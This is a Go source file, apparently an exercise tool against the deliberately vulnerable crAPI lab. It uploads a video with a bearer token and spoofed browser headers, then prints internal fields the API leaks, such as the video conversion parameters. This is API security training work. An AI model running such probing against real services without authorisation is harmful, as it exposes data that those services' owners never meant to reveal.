package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"

	configurator "github.com/tomek-skrond/crapiconfigurator"
)

type VideoResponse struct {
	ID               int    `json:"id"`
	VideoName        string `json:"video_name"`
	ConversionParams string `json:"conversion_params"`
	ProfileVideo     string `json:"profileVideo"`
}

func UploadVideo(video_path, token, target_url string) {
	// Open the file
	// Create a buffer to store our request body
	// Create a form file field
	// Copy the file contents into the form file field
	// Close the writer to finalize the multipart form
	requestBody, writer, shouldReturn := readVideo(video_path)
	if shouldReturn {
		return
	}

	// Create the request
	req, err := http.NewRequest("POST", target_url, &requestBody)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Add the headers
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	req.Header.Set("Sec-Ch-Ua", "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"")
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36")
	req.Header.Set("Sec-Ch-Ua-Platform", "\"Linux\"")
	req.Header.Set("Accept", "*/*")
	// req.Header.Set("Origin", "https://crapi.bobaklabs.com:8443")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	// req.Header.Set("Referer", "https://crapi.bobaklabs.com:8443/my-profile")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Priority", "u=1, i")
	req.Header.Set("Connection", "close")

	// Send the request
	client := configurator.CustomHttpClient()
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	// Read and print the response
	// Decode the JSON response
	var videoResponse VideoResponse
	decoder := json.NewDecoder(resp.Body)
	err = decoder.Decode(&videoResponse)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("Leaked video parameters:")
	fmt.Printf("ID: %d\n", videoResponse.ID)
	fmt.Printf("Video Name: %s\n", videoResponse.VideoName)
	fmt.Printf("Conversion Params: %s\n", videoResponse.ConversionParams)
	// fmt.Printf("Profile Video Length: %d\n", len(videoResponse.ProfileVideo)) // Only print the length
}

func readVideo(video_path string) (bytes.Buffer, *multipart.Writer, bool) {
	file, err := os.Open(video_path)
	if err != nil {
		fmt.Println(err)
		return bytes.Buffer{}, nil, true
	}
	defer file.Close()

	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	part, err := writer.CreateFormFile("file", video_path)
	if err != nil {
		fmt.Println(err)
		return bytes.Buffer{}, nil, true
	}

	_, err = io.Copy(part, file)
	if err != nil {
		fmt.Println(err)
		return bytes.Buffer{}, nil, true
	}

	writer.Close()
	return requestBody, writer, false
}
